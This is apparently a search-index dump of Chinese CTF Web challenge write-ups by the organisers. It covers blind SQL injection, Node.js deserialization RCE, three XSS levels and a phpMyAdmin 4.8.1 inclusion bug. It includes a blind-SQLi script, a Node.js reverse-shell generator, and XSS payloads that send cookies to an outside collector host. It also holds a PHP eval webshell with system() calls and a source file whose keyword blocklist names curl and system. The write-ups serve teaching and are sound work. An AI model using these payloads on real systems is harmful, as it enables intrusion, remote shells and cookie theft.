\u6bd4\u8d5b\u4e2d\uff0c\u4e00\u822c\u90fd\u662f flag,user,ctf \u4e4b\u7c7b\u7684 \u5b50\u67e5\u8be2\u601d\u8def\uff1a https://nosec.org/home/detail/2245.html \u76f2\u6ce8\u5177\u4f53\u65b9\u6cd5\u5f88\u591a\uff0c\u6211 POC \u91c7\u7528\u7684\u662f get_lock()\u51fd\u6570 \u5177\u4f53\u7528\u6cd5\u5982\u4e0b\uff1a https://xz.aliyun.com/t/2288 \uff08\u5410\u69fd\u4e00\u4e0b\u534f\u4f1a\u670d\u52a1\u5668\u6027\u80fd\u597d\u7684\u4e00\u6279\uff0c\u6b63\u5219\u5ef6\u8fdf\u6ce8\u5165\u79d2\u56de\uff0c\u5ef6\u8fdf\u4e0d\u4e86\u51e0\u79d2) \u4f46\u8fd9\u91cc\u7b2c\u4e8c\u5929\u53d1\u73b0 or \u548c and \u88ab\u653e\u51fa\u6765\u4e86\uff0c\u5f53\u65f6\u5f88\u60ca\u8bb6\uff0c\u672c\u6253\u7b97\u6539\u6765\u7740\uff0c\u4f46\u770b\u5230\u5230\u7b2c\u4e8c\u5929\u4e0b\u5348\u4e3a\u6b62\u4e5f\u6ca1\u51e0\u4e2a\u4eba\u505a\u51fa\u6765\uff0c\u5c31\u4e0d\u6253\u7b97\u6539\u4e86\uff0c\u5c31\u5f53\u964d\u4f4e\u96be\u5ea6\u4e86 \u6240\u4ee5\u8bf4\u8fd9\u9053\u9898\u5982\u679c\u6309\u6211\u539f\u5148\u7684\u51fa\u9898\u601d\u8def\u6765\u770b\u7684\u8bdd\uff0c\u7684\u786e\u6bd4\u8f83\u96be\uff0c\u6bd5\u7adf\u5dee\u4e0d\u591a\u5f53\u534a\u4e2a\u538b\u8f74\u7684\uff0c\u4f46\u51fa\u4e86\u95ee\u9898\u4e4b\u540e\uff0c\u96be\u5ea6\u4f4e\u4e86\u5f88\u591a\uff0c\u7ec6\u5fc3\u7422\u78e8\u505a\u4e00\u4e0b\u7684\u8bdd\uff0c\u8fd8\u662f\u53ef\u4ee5\u505a\u51fa\u6765\u7684~ \u8fd9\u91cc\u8d34\u4e00\u4e0b\u6211\u539f\u5148\u7684 poc \u811a\u672c\uff0c\u4f30\u8ba1\u73b0\u5728\u4e0d\u53ef\u7528\u4e86\uff0c\u65b0\u7684 poc \u53ef\u4ee5\u770b\u770b\u505a\u51fa\u6765\u961f\u4f0d\u7684\u6216\u8005\u7b49\u6211\u6709\u65f6\u95f4\u5199\uff08\u6700\u8fd1\u592a\u5fd9\u4e86~\uff09 import requests import string dic = string . digits + string . ascii_letters + \"!@#$%^&*()_+{}-=\" url = \"http://47.96.138.65:45787/?id=1\" session = requests . session () def flag (): i = 1 flag = \"\" while True : for j in dic : try : payoad = \"/**/ %26% 26/**/mid((select/**/`2`/**/from/**/(select/**/1,2,3,4/**/\" \\ \"union/**/select/**/*/**/from/**/flag)a/**/limit/**/1,1),{},1)='{}'/**/\" \\ \" %26% 26/**/get_lock('ddog',5)\" . format ( i , j ) url_all = url + payoad t = session . get ( url = url_all , timeout = 3 ) . content print ( t ) if len ( t ) != 0 : print (( \"[*]Flag:\" + flag ) . replace ( \"#&+\" , \"\" )) flag = flag + j except Exception : pass i = i + 1 if __name__ == \"__main__\" : flag () \u51fa\u9898\u4eba\u5bc4\u8bed \u00b6 \u603b\u800c\u8a00\u4e4b\uff0c\u8fd9\u6b21\u6211\u51fa\u7684\u9898\uff0c\u9664\u4e86 Sqli \u6709\u70b9\u5c0f\u96be\u4ee5\u5916\u5176\u4ed6\u4e24\u9053\u9898\u96be\u5ea6\u8fd8\u662f\u53ef\u4ee5\u7684\uff0c\u5fc3\u6001\u653e\u597d\u4ed4\u7ec6\u505a\u7684\u8bdd\uff0c\u63a5\u5927\u591a\u6570\u4eba\u8fd8\u662f\u53ef\u4ee5\u5728\u8fd9\u4e09\u9053\u9898\u62ff\u5230 480 \u5206\uff0c\u5bf9\u4e8e\u6211\u521a\u624d\u63d0\u5230\u7684 BabySqli \u7684\u539f\u6709\u601d\u8def\uff0c\u5927\u5bb6\u53ef\u4ee5\u81ea\u5df1\u642d\u5efa\u73af\u5883\u6d4b\u8bd5\u4e00\u4e0b\u505a\u9898\u601d\u8def\uff0c\u8fd9\u4e24\u5929\u5927\u5bb6\u4e5f\u505a\u9898\u8f9b\u82e6\u4e86\u54c8~","title":"Web"},{"location":"201905/Web/#web","text":"","title":"Web"},{"location":"201905/Web/#_1","text":"","title":"\u4f60\u597d\u5440"},{"location":"201905/Web/#_2","text":"NodeJS \u53cd\u5e8f\u5217\u5316","title":"\u8003\u67e5\u8981\u70b9"},{"location":"201905/Web/#_3","text":"\u6253\u5f00\u9898\u76ee\uff0cF12 \u67e5\u770b\u6e90\u7801\uff0c\u5728\u6ce8\u91ca\u4e2d\u53ef\u4ee5\u53d1\u73b0\u5728 /app.js.bak \u5904\u53ef\u4ee5\u67e5\u770b\u6e90\u7801\u3002 \u67e5\u770b\u6e90\u7801\u4e4b\u540e\uff0c\u53d1\u73b0\u4e00\u5904\u53cd\u5e8f\u5217\u5316\uff0c\u8003\u8651\u4f7f\u7528\u53cd\u5e8f\u5217\u5316\u6765\u8fdb\u884c\u4ee3\u7801\u6267\u884c\u3002 \u7531\u4e8e NodeJS \u7684\u4ee3\u7801\u6267\u884c\u5728\u540e\u7aef\u6267\u884c\uff0c\u6ca1\u6709\u56de\u663e\uff0c\u6b64\u5904\u6709\u51e0\u79cd\u5e38\u89c1\u65b9\u5f0f\u83b7\u5f97\u56de\u663e\uff1aDNS \u89e3\u6790\uff0cHTTP \u8bf7\u6c42\uff0c\u53cd\u5411 Shell\uff08\u7531\u4e8e docker \u53ea\u5f00\u653e\u4e86\u4e00\u4e2a\u7aef\u53e3\uff0c\u65e0\u6cd5\u4f7f\u7528\u6b63\u5411 Shell\uff09\u3002 DNS \u89e3\u6790\uff0cHTTP \u8bf7\u6c42\u7684\u5229\u7528\u65b9\u6cd5\u5927\u5bb6\u53ef\u4ee5\u81ea\u884c\u641c\u7d22\uff0c\u6b64\u5904\u5c55\u793a\u4f7f\u7528\u53cd\u5411 shell \u7684\u65b9\u6cd5\u3002\u9996\u5148\uff0c\u9700\u8981\u751f\u6210\u4e00\u4e2a nodejs \u7684\u53cd\u5411 shell\uff0c\u811a\u672c\u5982\u4e0b\uff1a import sys if len ( sys . argv ) != 3 : print \"Usage: %s <LHOST> <LPORT>\" % ( sys . argv [ 0 ]) sys . exit ( 0 ) IP_ADDR = sys . argv [ 1 ] PORT = sys . argv [ 2 ] def charencode ( string ): \"\"\"String.CharCode\"\"\" encoded = '' for char in string : encoded = encoded + \",\" + str ( ord ( char )) return encoded [ 1 :] print \"[+] LHOST = %s \" % ( IP_ADDR ) print \"[+] LPORT = %s \" % ( PORT ) NODEJS_REV_SHELL = ''' var net = require('net'); var spawn = require('child_process').spawn; HOST=\" %s \"; PORT=\" %s \"; TIMEOUT=\"5000\"; if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; } function c(HOST,PORT) { var client = new net.Socket(); client.connect(PORT, HOST, function() { var sh = spawn('/bin/sh',[]); client.write(\"Connected! \\\\ n\"); client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); sh.on('exit',function(code,signal){ client.end(\"Disconnected! \\\\ n\"); }); }); client.on('error', function(e) { setTimeout(c(HOST,PORT), TIMEOUT); }); } c(HOST,PORT); ''' % ( IP_ADDR , PORT ) print \"[+] Encoding\" PAYLOAD = charencode ( NODEJS_REV_SHELL ) print \"eval(String.fromCharCode( %s ))\" % ( PAYLOAD ) \u4f7f\u7528\u8fd9\u4e2a\u811a\u672c\u53ef\u4ee5\u751f\u6210\u4e00\u4e2a\u53cd\u5411 shell\uff0c\u7136\u540e\u53ea\u9700\u8981\u5c06\u8fd9\u4e2a\u53cd\u5411 shell \u653e\u5230 cookie \u91cc\u3002\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61 y={rce : function (){}} ,\u5c06\u4e0a\u9762\u7684\u7a0b\u5e8f\u751f\u6210\u7684\u4ee3\u7801\u7c98\u8d34\u5230\u82b1\u62ec\u53f7\u4e2d\uff0c\u4f7f\u7528 serialize \u65b9\u6cd5\u5bf9\u5176\u8fdb\u884c\u5e8f\u5217\u5316\uff0c\u5f97\u5230\u7684\u4ee3\u7801\u5728\u51fd\u6570\u540e\u52a0\u4e0a\u5706\u62ec\u53f7\uff0c\u4f7f\u5176\u80fd\u81ea\u52a8\u6267\u884c\u3002\u6548\u679c\u5982\u4e0b\uff1a","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"201905/Web/#xss","text":"\u6b64\u6b21\u6bd4\u8d5b\u7684\u4e09\u9053 XSS \u662f\u672c\u7740\u4e0d\u51fa\u8111\u6d1e\u7684\u60f3\u6cd5\u51fa\u7684\uff0c\u9898\u76ee\u672c\u8eab\u6ca1\u6709\u7ed5\u592a\u591a\u5708\u5708\uff0c\u4f46\u662f\u5728\u6bd4\u8d5b\u73af\u5883\u4e0b\u6ca1\u6709\u8003\u8651\u5230\u8d44\u6e90\u5360\u7528\u8fc7\u591a\u548c\u50f5\u5c38\u7a0b\u5e8f\u7684\u60c5\u51b5\uff0c\u5bfc\u81f4\u7f51\u9875\u5de8\u5361\u65e0\u6bd4\u548c\u4e0d\u80fd\u6253\u51fa flag \u7684\u73b0\u8c61\u3002\u6b64\u5916\uff0c\u7531\u4e8e\u51fa\u9898\u65f6\u5404\u51fa\u9898\u4eba\u6ca1\u6709\u534f\u5546 flag \u683c\u5f0f\u7684\u95ee\u9898\uff0c\u6211\u5f55\u5165 docker \u7684\u65f6\u5019 flag \u683c\u5f0f\u5c31\u4e3a fl4g{} \uff0c\u6700\u540e\u4e0a\u9898\u7684\u65f6\u5019\u53c8\u8981\u6c42 scuctf{} \uff0c\u53ef\u80fd\u5751\u4e86\u4e00\u4e9b\u4eba\uff0c\u505a\u9898\u4f53\u9a8c\u5e76\u4e0d\u597d\uff0c\u5728\u8fd9\u91cc\u8868\u793a\u62b1\u6b49 \u4e09\u9053\u9898\u90fd\u662f\u540c\u4e00\u4e2a\u63d0\u4ea4\u5e73\u53f0\uff0c\u4f7f\u7528\u5b50\u8def\u5f84\u4f5c\u4e3a\u9650\u5236(\u63a8\u8350\u9605\u8bfb\uff1a https://www.cnblogs.com/fsjohnhuang/archive/2011/11/22/2258999.html )\uff0c\u4ee5\u8fbe\u5230\u4e09\u9898\u5206\u79bb\u4f46\u662f\u53c8\u4f7f\u7528\u540c\u4e00\u4e2a bot \u7684\u6548\u679c\u3002\u5176\u5b9e\u5728\u8fd9\u91cc\u6211\u8fd8\u662f\u633a\u6015\u51fa\u73b0\u7b80\u5355\u9898\u6253\u5230\u56f0\u96be\u9898\u7684 flag \u7684\u975e\u9884\u671f\u89e3\uff08\u867d\u7136\u5fc3\u7406\u4e0a\u8fd8\u662f\u6bd4\u8f83\u80af\u5b9a\u4e0d\u4f1a\u51fa\u8fd9\u79cd\u60c5\u51b5 XD\uff09 \u6240\u4ee5\uff0c \u4e09\u9053\u9898\u90fd\u662f\u5c06\u5305\u542b\u6253 cookie payload \u7684 url \u4ea4\u7ed9\u63d0\u4ea4\u5e73\u53f0\uff0c\u5e73\u53f0 robot \u4f7f\u7528 firefox \u53bb\u8bbf\u95ee\u4f60\u63d0\u4ea4\u7684 url\uff0c\u4ece\u800c\u83b7\u53d6\u5230\u5728 cookie \u91cc\u7684 flag \u5410\u69fd\uff1axss bot \u771f\u7684\u5751\uff0c\u82b1\u4e86\u5f88\u957f\u65f6\u95f4\u6765\u8c03 bot\uff0c\u7ed3\u679c\u6bd4\u8d5b\u7684\u65f6\u5019\u8fd8\u662f\u51fa\u95ee\u9898\u3002\u3002\u3002\u679c\u7136\u662f\u4ece\u5165\u5751\u5230\u653e\u5f03:) \u63d0\u4ea4\u5e73\u53f0\u622a\u56fe\uff1a","title":"\u4e09\u9053 XSS \u603b\u62ec"},{"location":"201905/Web/#xss_1","text":"","title":"\u7b80\u5355\u7684 XSS"},{"location":"201905/Web/#_4","text":"XSS \u57fa\u672c\u6982\u5ff5 XSS \u83b7\u53d6 cookie","title":"\u8003\u5bdf\u8981\u70b9"},{"location":"201905/Web/#_5","text":"","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"201905/Web/#_6","text":"\u672c\u9898\u6ca1\u6709\u4efb\u4f55\u8fc7\u6ee4\uff0c\u76f4\u63a5\u8f93\u51fa\u4f20\u5165\u503c\uff0c\u5178\u578b\u7684 XSS \u5165\u95e8\u540e\u53f0\u4ee3\u7801\u3002 \u9996\u5148\uff0c\u770b\u5230\u7f51\u9875\u5c06\u4f20\u5165\u7684\u53c2\u6570\u539f\u6837\u8fd4\u56de\uff1a \u8f93\u5165\u7b80\u5355\u7684\u5f39\u7a97 payload: ?greet=<script>alert(document.domain)</script> \u76f4\u63a5\u5f39\u51fa domain\uff0c\u53ef\u89c1\u6b64\u5904\u6709 XSS \u6f0f\u6d1e\uff1a","title":"\u8bd5\u63a2\u548c\u5f39\u7a97"},{"location":"201905/Web/#flag","text":"\u9996\u5148\uff0c\u5c1d\u8bd5\u5c06\u81ea\u5df1\u7684 cookie \u6253\u5230 xss \u5e73\u53f0\u4e0a\u3002 \u76f4\u63a5\u586b\u5165 payload: ?greet=%3Cimg/src=x%20onerror=%22a=%27http://120.78.185.175/xss/myxss?s=%27%2Bdocument.cookie;new%20Image().src=a%22%3E \uff0c\u8bbf\u95ee\uff1a \u770b\u5230\u6210\u529f\u6253\u51fa cookie\uff1a \u5c06 payload \u8f93\u5165\u63d0\u4ea4\u9875\u9762\u83b7\u53d6 flag\uff1a \u6ce8\u610f\u8981\u5f39\u51fa\u4ee5\u4e0b\u7a97\u53e3\u624d\u8bf4\u660e bot \u6210\u529f\u8bbf\u95ee\u4e86 url\uff1a \u67e5\u770b XSS \u5e73\u53f0\u53ef\u4ee5\u770b\u5230\u6210\u529f\u6253\u5230\u7684 flag\uff1a","title":"\u83b7\u53d6 flag"},{"location":"201905/Web/#xss_2","text":"\u672c\u9898\u7075\u611f\u6765\u6e90\u4e8e\u4e00\u7bc7\u6f0f\u6d1e\u60ac\u8d4f\u7684\u5b9e\u6218 blog\uff0c\u6211\u8bb0\u4e0d\u5230\u5177\u4f53\u51fa\u5904\u4e86\uff0c\u5c31\u63a8\u8350\u4e00\u4e2a \u7f51\u7ad9 \u5427","title":"\u7a0d\u96be\u4e00\u70b9\u7684 XSS"},{"location":"201905/Web/#_7","text":"CSP DOM XSS\uff08Script Gadgets\uff09 \u7ed5\u8fc7 CSP Angularjs","title":"\u8003\u5bdf\u8981\u70b9"},{"location":"201905/Web/#_8","text":"\u672c\u9898\u5728\u7ed9\u51fa hint \u4e4b\u540e\u96be\u5ea6\u964d\u4f4e\u4e86\uff0c\u987a\u7740\u601d\u8def\u8d70\u5c31\u884c\u3002","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"201905/Web/#_9","text":"\u8fd8\u662f\u67e5\u770b\u7f51\u9875\uff0c\u53d1\u73b0\u8fd9\u56de\u6709 CSP \u7b56\u7565\u4e86\uff0c\u5176\u4e2d\u6709\u4e2a\u70b9\u503c\u5f97\u6ce8\u610f\uff1aCSP \u5bf9 sina \u67d0\u57df\u4e0b\u653e\u884c: *.sinaapp.com \uff1a \u8fd9\u4e2a\u57df\u4e0b\u6709\u5565\u597d\u4e1c\u897f\u5462\uff0c\u8fd9\u4e2a\u57df\u4e0b\u6709 lib.sinaapp.com \u662f\u4e2a CDN\uff0c\u53ef\u4ee5\u76f4\u63a5\u5f15\u5165 JS \u5e93\u3002\u4e8e\u662f\u5c31\u60f3\u8d77 17 \u5e74 blackhat \u4e0a\u7684\u6f14\u8bb2\uff1a Script Gadgets \u5728\u8be5\u57df\u4e0b\u627e\u5230\u6709 angularjs \u7684\u5e93\uff0c\u5e76\u4e14\u5b58\u5728\u8001\u7248\u672c\u7684\u5e93: \u8001\u7248\u672c\u7684\u5e93\u6ca1\u6709\u5b89\u5168\u8fc7\u6ee4\uff0c\u53ef\u4ee5\u8fbe\u5230\u7ed5\u8fc7 CSP \u7684\u6548\u679c\uff0cpayload \u4e3a\uff1a <div ng-app> {{constructor.constructor('alert(document.domain)')()}} </div> \u6784\u9020\u5f39\u7a97 payload\uff1a http://120.78.185.175:5000/hachp1/wuziqi/index.php??guest_name=%3Cscript%20src=http://lib.sinaapp.com/js/angular.js/angular-1.0.6/angular.min.js%3E%3C/script%3E%3Cdiv%20ng-app%3E{{constructor.constructor(\"alert(document.domain)\")()}}%3C/div%3E \u6210\u529f\u5f39\u7a97\uff1a","title":"\u8bd5\u63a2\u548c\u5f39\u7a97"},{"location":"201905/Web/#flag_1","text":"\u90fd\u5df2\u7ecf\u5f39\u7a97\u4e86\uff0c\u63a5\u4e0b\u6765\u5c31\u597d\u529e\u4e86\uff0c\u7c7b\u4f3c\u7b2c\u4e00\u9898\uff0c\u76f4\u63a5\u4e0a payload\uff1a http://120.78.185.175:5000/hachp1/wuziqi/index.php?guest_name=%3Cscript%20src=http://lib.sinaapp.com/js/angular.js/angular-1.0.6/angular.min.js%3E%3C/script%3E%3Cdiv%20ng-app%3E{{constructor.constructor(\"document.location='http://120.78.185.175/xss/myxss?c='%2Bdocument.cookie;\")()}}%3C/div%3E \u62ff\u5230 flag\uff1a","title":"\u83b7\u53d6 flag"},{"location":"201905/Web/#xss_3","text":"","title":"\u66f4\u96be\u7684 XSS"},{"location":"201905/Web/#_10","text":"\u539f\u6709\u7684 script \u6807\u7b7e\u53ef\u88ab\u4e4b\u524d\u63d2\u5165\u7684 <script> \u7834\u574f \u6807\u7b7e name \u53ef\u4ee5\u901a\u8fc7 js \u76f4\u63a5\u6210\u4e3a\u53d8\u91cf\u4ece\u800c\u8986\u76d6\u53d8\u91cf \u641c\u539f\u9898\u7684\u80fd\u529b:)","title":"\u8003\u5bdf\u8981\u70b9"},{"location":"201905/Web/#wp","text":"\u672c\u9898\u6765\u6e90\u4e8e TCTF2018 \u7684 bl0g \u9898 \u539f\u9898 WP \u63a8\u8350 https://lorexxar.cn/2018/04/05/0ctf2018-blog/","title":"\u539f\u9898 WP"},{"location":"201905/Web/#_11","text":"","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"201905/Web/#_12","text":"\u8fdb\u5165\u7f51\u9875\uff0c\u8fd8\u662f CSP\uff0c\u4f46\u662f\u66f4\u4e25\u683c\u4e86\uff1a \u66f4\u6539 payload\uff0c\u67e5\u770b\u6e90\u4ee3\u7801\uff0c\u53ef\u4ee5\u770b\u5230\u53c2\u6570\u8f93\u51fa\u7684\u4e24\u4e2a\u4f4d\u7f6e\uff1a \u9875\u9762\u4e2d\u7684 JS \u4ee3\u7801\u8fd0\u884c\u8fc7\u7a0b\u5206\u6790\u4e00\u4e0b\uff0c\u6700\u540e\u4e00\u6bb5\u6e90\u7801\u5c06\u7b2c\u4e00\u6bb5\u6e90\u7801\u4e2d\u51fa\u73b0\u7684\u8fde\u63a5 append \u5230\u7f51\u9875\u540e\uff1a \u89c2\u5bdf\u53ef\u4ee5\u53d1\u73b0\uff0c\u53ef\u63a7\u70b9\u4e00\u4e2a\u5728\u7b2c\u4e00\u6bb5\u4ee3\u7801\u524d\uff0c\u4e00\u4e2a\u5219\u76f4\u63a5\u51b3\u5b9a\u4e86 name_links \u7684\u7d22\u5f15\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7b2c\u4e00\u4e2a\u53ef\u63a7\u70b9\u7834\u574f\u7b2c\u4e00\u6bb5\u4ee3\u7801\uff0c\u7b2c\u4e8c\u6bb5\u4ee3\u7801\u6784\u9020 name \u4e3a name_links \u7684 form \u6807\u7b7e\uff0c\u5e76\u76f4\u63a5\u901a\u8fc7 name_links \u83b7\u53d6\u6211\u4eec\u6784\u9020\u7684\u6807\u7b7e\u7684 id \u503c\uff0c\u5e76\u628a\u503c\u8f93\u51fa\u5728\u9875\u9762\u4e0a\uff1b\u6b64\u65f6\uff0c\u5c31\u53ef\u4ee5\u5c06\u6076\u610f payload \u6ce8\u5165\u7f51\u9875\u3002\uff08\u53ef\u80fd\u903b\u8f91\u6709\u70b9\u6655\uff0c\u5efa\u8bae\u5bf9\u7167 TCTF \u539f\u9898 WP \u4e00\u8d77\u7406\u89e3\uff09 \u6700\u540e\uff0c\u5f39\u7a97 payload \u5982\u4e0b\uff08\u9700\u8981\u6ce8\u610f\u7684\u4e24\u70b9\u662f\uff0c1. \u53ea\u6709\u6807\u7b7e\u539f\u6709\u7684\u5c5e\u6027\u540d\u624d\u80fd\u6210\u529f\u83b7\u53d6\u5230\uff0c\u6240\u4ee5\u8fd9\u91cc\u4f7f\u7528\u7684\u662f id \u6765\u83b7\u53d6\uff1b2. \u5728\u8fd9\u91cc\u6211\u8fc7\u6ee4\u4e86\u9664 form \u5916\u7684\u5176\u4ed6\u6807\u7b7e\uff0c\u6240\u4ee5\u9700\u8981\u5148\u95ed\u5408\u524d\u9762\u7684 form \u6807\u7b7e\uff0c\u539f\u9898\u7684 WP \u4e0d\u80fd\u76f4\u63a5\u7528\uff09\uff1a http://120.78.185.175:5000/hachp1/pintu/index.php?name=%22%3E%3Cscript%3E&ft_id=id%22%3E%3C/form%3E%3CForm+name%3Dname_links+id%3D%22%3Cscript%3Ealert(document.domain);%3C%2Fscript%3E%22%3E \u5f39\u7a97\u5982\u4e0b\uff1a","title":"\u8bd5\u63a2\u548c\u5f39\u7a97"},{"location":"201905/Web/#flag_2","text":"\u540c\u7b2c\u4e8c\u9898\uff0c\u90fd\u5f39\u7a97\u4e86\uff0c\u5269\u4e0b\u7684\u4e0d\u7528\u8bf4\u4e86\uff0c\u6253 flag\uff1a http://120.78.185.175:5000/hachp1/pintu/index.php?name=\"><script>&ft_id=id\"></form><Form+name%3Dname_links+id%3D\"<script>document.location='http://120.78.185.175/xss/myxss?c='%2Bdocument.cookie;<%2Fscript>\"> flag:","title":"\u83b7\u53d6 flag"},{"location":"201905/Web/#_13","text":"\u6700\u540e\uff0c\u795d\u8d3a\u5728\u6bd4\u8d5b\u4e2d\u6253\u51fa\u4e09\u9053\u9898\u7684\u5927\u4f6c XD\uff0c\u4e5f\u5e0c\u671b\u6ca1\u6709\u6253\u51fa\u6765\u7684\u540c\u5b66\u4eec\u80fd\u5b66\u5230\u4e00\u4e9b\u4e1c\u897f\uff0c\u8fd9\u6837\u8fd9\u4e09\u9898\u7684\u4f7f\u547d\u5c31\u5b8c\u6210\u4e86\u3002","title":"\u51fa\u9898\u4eba\u5bc4\u8bed"},{"location":"201905/Web/#_14","text":"\u8fd9\u9053\u9898\u522b\u770b 400 \u591a\u5206\u5728 Web \u9898\u91cc\u5206\u662f\u6700\u9ad8\u7684\uff0c\u5176\u5b9e\u8fd9\u4e5f\u7b97\u4e00\u9053\u9001\u5206\u9898\uff0c\u5b9e\u9645\u96be\u5ea6\u5927\u6982 150 \u5206\u5de6\u53f3 \u5230\u6700\u540e\u53ea\u6709\u56db\u4e94\u4e2a\u961f\u4f0d\u505a\u51fa\u6765\uff0c\u8fd8\u662f\u6709\u4e9b\u611f\u6168 \u9898\u76ee\u63d0\u793a\u4e86\u7528\u6237\u540d\u662f scuctf\uff0c\u5bc6\u7801\u6ca1\u7ed9\uff0c\u8fd9\u79cd\u60c5\u51b5\u90fd\u662f\u5f31\u53e3\u4ee4\uff0c\u76f4\u63a5 BurpSuite \u7206\u7834\u4e00\u4e0b 123456 \u5c31\u51fa\u6765\u4e86 \u8fdb\u53bb\u770b\u5230 PhpMyAdmin\uff0c\u6ca1\u6709\u5168\u5c40\u6743\u9650\uff0c\u90a3\u5c31\u4e0d\u53ef\u4ee5\u5199\u6587\u4ef6\u4e4b\u7c7b\u7684\uff0c\u53f3\u8fb9\u770b\u5230 PhpMyAdmin \u7248\u672c\u4e3a 4.8.1 \u7136\u540e\u641c\u4e00\u4e0b\u8fd9\u4e2a\u7248\u672c\u7684\u6f0f\u6d1e\uff0c\u53d1\u73b0\u4e00\u4e2a\u540e\u53f0 getshell \u7684\u6f0f\u6d1e https://www.cnblogs.com/fox-yu/p/9209203.html \u76f4\u63a5\u4e0a\u6700\u7b80\u5355\u7684\u505a\u6cd5\uff0c\u8fd8\u6709\u4e00\u4e2a\u5199\u5165\u8868\u5185\u5305\u542b\u8868\u6587\u4ef6\u7684\u505a\u6cd5\u81ea\u5df1\u627e\u627e\u54c8\uff0c\u539f\u7406\u4e00\u6837~ select '<?php @eval($_GET[1]);?>' ; \u7136\u540e\u5305\u542b\u4e00\u4e0b sess_cookie \u6587\u4ef6 index.php?target=db_sql.php%3f/../../../../../../../../var/lib/php/sessions/sess_(\u4f60\u7684cookie) cookie \u662f phpMyAdmin \u7684\u503c \u7136\u540e index.php?target=db_sql.php%3f/../../../../../../../../var/lib/php/sessions/sess_(\u4f60\u7684cookie)&1=system('ls /'); index.php?target=db_sql.php%3f/../../../../../../../../var/lib/php/sessions/sess_(\u4f60\u7684cookie)&1=system('cat /fl444444g'); \u8fd9\u9053\u9898\u5230\u6b64\u4e3a\u6b62~","title":"\u827e\u8fea\u9b54\u529b\u8f6c\u5708\u5708"},{"location":"201905/Web/#_15","text":"\u8fd9\u9053\u9898\u4e00\u5f00\u59cb\u662f\u6ca1\u4eba\u505a\u51fa\u6765\u7684\uff0c\u4f46\u53ea\u6709 80 \u5206\u7684\u9898\u561b\uff0c\u80fd\u96be\u5012\u90a3\u91cc\u53bb\u5462\uff1f \u8fd9\u91cc\u4f7f\u7528\u7b2c\u4e8c\u4e2a\u5730\u5740\uff08\u4fe9\u5730\u5740\u4e00\u6837\uff09 \u7ed9\u7684\u5730\u5740\u53ea\u662f http://47.96.138.65:45787/didi \u8fdb\u53bb\u4e4b\u540e\u5c31\u4e00\u4e2a\u8170\u5b50\u59d0\u548c PDD\uff0c\u4f46\u662f\u4f60\u4eec\u4ed4\u7ec6\u89c2\u5bdf UR \u91cc\u7684\u53d8\u5316\u4e86\u561b\uff1f \u4f60\u8f93\u5165\u7684\u662f http://47.96.138.65:45787/didi \u8fdb\u53bb\u53d8\u6210\u4e86 http://47.96.138.65:45787/didi/secret.php apache \u9ed8\u8ba4\u7684\u5165\u53e3\u6587\u4ef6\u662f index.php \u4ed6\u5374\u662f\u51fa\u73b0\u7684 secret.php\uff0c\u8fd9\u4e0d\u662f\u6709\u95ee\u9898\u561b F12 \u4e00\u4e0b\u770b\u5230 index.php \u88ab 302 \u8df3\u8f6c\u4e86\uff0c\u5e76\u4e14 flag \u5c31\u5728\u4e0b\u9762\u7684 Set-Cookie \u4e2d\uff0c\u8fd9\u91cc\u6211\u8bbe\u7f6e\u4e86 cookie \u751f\u6548\u65f6\u95f4\u4e3a 0.01 \u79d2\uff0c\u4e14\u53ea\u5bb9\u8bb8\u5bf9 index.php \u751f\u6548\uff0c\u6240\u4ee5\u5728\u5176\u4ed6\u7f51\u9875\u91cc\u662f\u770b\u4e0d\u5230\u7684 \u76f4\u63a5\u628a flag \u7684\u503c base64 \u89e3\u7801\u4e00\u4e0b\u5c31\u51fa\u6765 flag \u4e86 \u505a\u9898\u8fc7\u7a0b\u4e2d\u770b\u5230\u6709\u7684\u540c\u5b66\u76f4\u63a5 scuctf{U0NVQ1RGe3kwVV9qVXM3X25lRWRfY2FyM2Z1bH0%3D} \u63d0\u4ea4\u4e86\u4e0a\u6765\uff0c\u5176\u5b9e\u5c31\u5dee\u6700\u540e\u4e00\u6b65\u4e86\uff0c\u6709\u70b9\u53ef\u60dc~ \u6240\u4ee5\u8fd9\u9053\u9898\u5176\u5b9e\u5f88\u7b80\u5355\uff0c\u5c31\u8003\u4e2a\u7b80\u5355\u7684\u6293\u5305\u548c\u770b\u4f60\u7ec6\u5fc3\u7a0b\u5ea6\uff0cOK \u4e0b\u4e00\u9053~","title":"\u6765\u4e86\u8001\u5f1f"},{"location":"201905/Web/#babysqli","text":"\u8fd9\u91cc\u653e\u4e0a\u6e90\u4ee3\u7801 config.php <?php error_reporting ( 0 ); $servername = \"localhost\" ; $username = \"root\" ; $password = \"**********************\" ; $dbname = \"scuctf\" ; function stop_hack ( $value ){ $pattern = \"insert|delete|bool|extractvalue|rand|group|geometrycollection|multipoint|multipolygon|regexp|linestring|multilinestring|name_const|right|char|benchmark|polygon|char|rlike|concat|rpad|repeat|sleep|ascii|innodb|and|if|exp|updatexml|left|pow|concat_ws|group_concat|substr|join|floor|\\.\\.\\/|\\.\\/|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system| |eval\" ; $back_list = explode ( \"|\" , $pattern ); foreach ( $back_list as $hack ){ if ( preg_match ( \"/ $hack /i\" , $value )) die ( \" $hack detected!Do not want to get flag!!<br>\" ); } return $value ; } ?> index.php <?php include 'config.php' ; error_reporting ( 0 ); $conn = new mysqli ( $servername , $username , $password , $dbname ); if ( $conn -> connect_error ) { die ( \"\u8fde\u63a5\u5931\u8d25: \" ); } $sql = \"SELECT COUNT(*) FROM users\" ; $whitelist = array (); $result = $conn -> query ( $sql ); if ( $result -> num_rows > 0 ){ $row = $result -> fetch_assoc (); $whitelist = range ( 1 , $row [ 'COUNT(*)' ]); } if ( ! empty ( $_GET [ 'id' ])){ $id = stop_hack ( $_GET [ 'id' ]); $sql = \"SELECT * FROM users WHERE id= $id \" ; if ( ! in_array ( $id , $whitelist )) { die ( \"id $id is not in whitelist.\" ); } $result = $conn -> query ( $sql ); if ( $result -> num_rows > 0 ){ $row = $result -> fetch_assoc (); foreach ( $row as $key => $value ) { if ( preg_match ( \"/scuctf{.+?}/i\" , $value )){ die ( \"scuctf is found!!\" ); } } echo \"<center><table 